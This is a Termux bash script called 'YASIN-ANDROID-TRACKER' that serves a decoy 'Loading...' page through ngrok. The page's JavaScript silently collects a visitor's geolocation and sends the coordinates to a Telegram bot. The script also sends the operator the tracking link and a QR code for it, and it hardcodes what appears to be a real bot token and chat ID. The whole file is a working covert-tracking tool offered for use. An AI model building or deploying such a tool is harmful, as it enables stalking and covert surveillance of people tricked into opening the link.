#!/bin/bash

# YASIN-ANDROID-TRACKER
# Created by Md Yasin Arafat
# Telegram Tracking Bot Integration

BOT_TOKEN="8128619794:AAGhkVx-64tgJeoSXB_VDSQk7LnZaOECJcI"
CHAT_ID="5548654620"

GREEN='\033[1;32m'
NC='\033[0m'

echo -e "${GREEN}[+] Installing dependencies...${NC}"
pkg update -y
pkg install -y curl termux-api php unzip

echo -e "${GREEN}[+] Checking ngrok...${NC}"
if [ ! -f "$PREFIX/bin/ngrok" ]; then
  echo -e "${GREEN}[+] Installing ngrok...${NC}"
  curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
  unzip ngrok-stable-linux-arm.zip
  mv ngrok $PREFIX/bin/
  chmod +x $PREFIX/bin/ngrok
fi

echo -e "${GREEN}[+] Starting local server...${NC}"
mkdir -p ~/trackserver
cd ~/trackserver
cat <<EOF > index.html
<html><body><h2>Loading...</h2><script>
navigator.geolocation.getCurrentPosition(function(pos){
  fetch('https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=Location: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
});
</script></body></html>
EOF

echo -e "${GREEN}[+] Starting PHP server and ngrok...${NC}"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
ngrok http 8080 > /dev/null 2>&1 &
sleep 8

NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\\.ngrok.io')
echo -e "${GREEN}[+] Ngrok URL generated:${NC} $NGROK_URL"

# Send link to Telegram
curl -s "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=Your tracking link: $NGROK_URL"

# Generate QR via API & Send to Telegram
QR_URL="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=$NGROK_URL"
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
-F chat_id="$CHAT_ID" \
-F photo="$QR_URL"

echo -e "${GREEN}[+] Tracker is live. QR Code sent via Telegram.${NC}"
